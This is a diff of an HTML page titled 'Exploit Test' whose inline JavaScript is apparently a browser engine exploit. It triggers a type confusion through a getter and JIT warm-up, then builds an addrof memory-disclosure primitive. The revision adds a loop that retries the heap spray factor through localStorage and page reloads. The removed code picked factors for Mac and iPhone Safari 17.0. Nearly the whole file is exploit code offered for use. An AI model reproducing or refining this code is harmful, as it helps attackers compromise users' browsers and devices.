@@ -1,117 +1,108 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="util.js"></script>
-    <script src="int64.js"></script>
-    <title>Document</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <script src="util.js"></script>
+  <script src="int64.js"></script>
+  <title>Exploit Test</title>
 </head>
 <body>
-    <p id="status"></p>
-    <script>
-        let boxed_arr = new Function();
-        boxed_arr.p1 = 1.1;
-        boxed_arr[0] = {};
+  <p id="status">Status:</p>
+  <p id="counter">Tentativa atual: </p>
 
-        let getter = new Function();
-        getter.p1 = 1.1;
-        getter[0] = 1.1;
+  <script>
+    const minFactor = 87;
+    const maxFactor = 1087; // 87 + 1000
+    let currentFactor = parseInt(localStorage.getItem('currentFactor') || minFactor);
 
-        let shape = {};
-        for (let i = 0; i < 14; ++i) {
-            shape['p'+i] = i;
+    document.getElementById("counter").textContent = `Tentativa atual: ${currentFactor} (de ${minFactor} até ${maxFactor})`;
+
+    let boxed_arr = new Function();
+    boxed_arr.p1 = 1.1;
+    boxed_arr[0] = {};
+
+    let getter = new Function();
+    getter.p1 = 1.1;
+    getter[0] = 1.1;
+
+    let shape = {};
+    for (let i = 0; i < 14; ++i) {
+      shape['p' + i] = i;
+    }
+
+    let shapes = [];
+    for (let i = 0; i < 100; ++i) {
+      shapes.push({ ...shape, ['z' + i]: 0x1337 });
+    }
+
+    function trigger(type) {
+      let object_a = { foo: 1, p1: 1.1 };
+      let object_b = { foo: 1 };
+      object_b.__defineGetter__('p1', getter);
+
+      function get_getterSetter(type) {
+        let o = (type == 0) ? object_a : object_b;
+        let retval;
+        for (let i = 0; i < 2; ++i) retval = o.foo;
+        return retval;
+      }
+
+      for (let i = 0; i < 1e6; ++i) get_getterSetter(i % 2);
+      return [getter, get_getterSetter(1)];
+    }
+
+    (function pwn() {
+      let [getter, getterSetter] = trigger();
+      let success = false;
+      try { getterSetter.toString(); }
+      catch (e) { success = true; }
+
+      if (!success) {
+        document.getElementById("status").textContent = "Exploit falhou... tentando novamente!";
+        currentFactor++;
+        if (currentFactor > maxFactor) {
+          alert("Fim das tentativas.");
+          localStorage.removeItem('currentFactor');
+        } else {
+          localStorage.setItem('currentFactor', currentFactor);
+          location.reload();
         }
+        return;
+      }
 
-        let shapes = [];
-        for (let i = 0; i < 100; ++i) {
-            shapes.push({
-                ...shape,
-                ['z'+i]: 0x1337
-            });
+      let symbolObject = Object(getterSetter);
+      let ref_arr = [];
+      for (let i = 0; i < currentFactor; ++i) {
+        ref_arr.push(symbolObject.description);
+      }
+
+      getter.p13 = 1.1;
+      let unboxed_arr = getter;
+
+      function addrof(o) {
+        boxed_arr[8] = o;
+        return Int64.fromDouble(unboxed_arr[0]);
+      }
+
+      let sample = BigInt(addrof({}).toString());
+      if (sample >= 0x200000000 || sample < 0x100000000) {
+        document.getElementById("status").textContent = "Exploit falhou... tentando novamente!";
+        currentFactor++;
+        if (currentFactor > maxFactor) {
+          alert("Fim das tentativas.");
+          localStorage.removeItem('currentFactor');
+        } else {
+          localStorage.setItem('currentFactor', currentFactor);
+          location.reload();
         }
-
-        function trigger(type) {
-            let object_a = {};
-            object_a.foo = 1;
-            object_a.p1 = 1.1;
-
-            let object_b = {};
-            object_b.__defineGetter__('p1', getter);
-            object_b.foo = 1;
-
-            function get_getterSetter(type) {
-                let o, retval;
-
-                if (type == 0) o = object_a;
-                else o = object_b;
-
-                for (let i = 0; i < 2; ++i) {
-                    if (type == 0) retval = o.foo;
-                    else retval = o.foo;
-                }
-                return retval;
-            }
-
-            for (let i = 0; i < 1e6; ++i) {
-                get_getterSetter(i % 2);
-            }
-            return [getter, get_getterSetter(1)];
-        }
-
-        (function pwn() {
-            let [getter, getterSetter] = trigger();
-            let success = false;
-            try {
-                getterSetter.toString();
-            } catch(e) {
-                success = true;
-            }
-
-            if (!success) {
-                document.getElementById("status").innerHTML = "Exploit failed.. Trying again!";
-                location.reload();
-                return;
-            }
-
-            let symbolObject = Object(getterSetter);
-
-            let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
-            let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
-            let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
-            let factor;
-            let unknown_device = false;
-
-            if (isMac && version == '17.0') {
-                factor = 840;
-            } else if (isIphone && version == '17.0') {
-                factor = 87;
-            } else {
-                factor = 87;
-                unknown_device = true;
-            }
-
-            let ref_arr = [];
-            let currentFactor = 87; // Start with the smallest value
-            let maxFactor = factor + 1000; // Example max range
-            function updateStatus() {
-                document.getElementById("status").innerHTML = `Testing factor: ${currentFactor}`;
-            }
-            
-            // Sequentially testing factors
-            function nextAttempt() {
-                if (currentFactor <= maxFactor) {
-                    ref_arr.push(symbolObject.description);
-                    updateStatus();
-                    currentFactor++;
-                    setTimeout(nextAttempt, 1000); // Retry every second
-                } else {
-                    alert('Test complete or max attempts reached.');
-                }
-            }
-
-            nextAttempt();
-        })();
-    </script>
+        return;
+      } else {
+        alert(`Exploit bem-sucedido com factor: ${currentFactor}`);
+        document.getElementById("status").textContent = "Sucesso!";
+        localStorage.removeItem('currentFactor');
+      }
+    })();
+  </script>
 </body>
 </html>
